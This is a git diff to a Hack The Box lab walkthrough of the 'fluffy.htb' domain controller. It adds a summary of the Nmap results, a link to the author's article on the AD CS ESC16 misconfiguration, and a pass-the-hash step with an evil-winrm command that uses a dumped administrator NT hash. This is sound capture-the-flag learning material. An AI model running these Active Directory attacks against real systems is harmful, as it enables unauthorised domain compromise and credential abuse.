@@ -299,6 +299,9 @@ Nmap done: 1 IP address (1 host up) scanned in 105.05 seconds
            Raw packets sent: 21 (900B) | Rcvd: 18 (776B)
 
 ```
+
+Nmap  result reveals a Windows domain controller with Active Directory services (LDAP/LDAPS, Kerberos, DNS, SMB) and multiple RPC/WinRM endpoints — LDAPS uses a self-signed DC01 certificate.
+
 ## Enumeration
 
 We begin by enumerating users using `netexec`:
@@ -643,7 +646,10 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\winrm_svc\Documents> exit
 ```
 
-## [Privilege Escalation ADCS ESC 16](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
+## Privilege Escalation ADCS ESC 16
+
+
+A detailed blog post I wrote, where I explain the AD CS ESC16 misconfiguration and its exploitation in depth. You can read the full article **[Here](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)**.
 
 We first leveraged our GenericWrite rights to perform a Shadow Credentials attack against the ca_svc account.
 
@@ -805,6 +811,10 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Trying to retrieve NT hash for 'administrator'
 [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e                                         
 ```
+
+### Pass-the-Hash — Administrator Access
+
+Using pass-the-hash, I accessed the system as Administrator:
 
 ```
 evil-winrm -i $IP -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
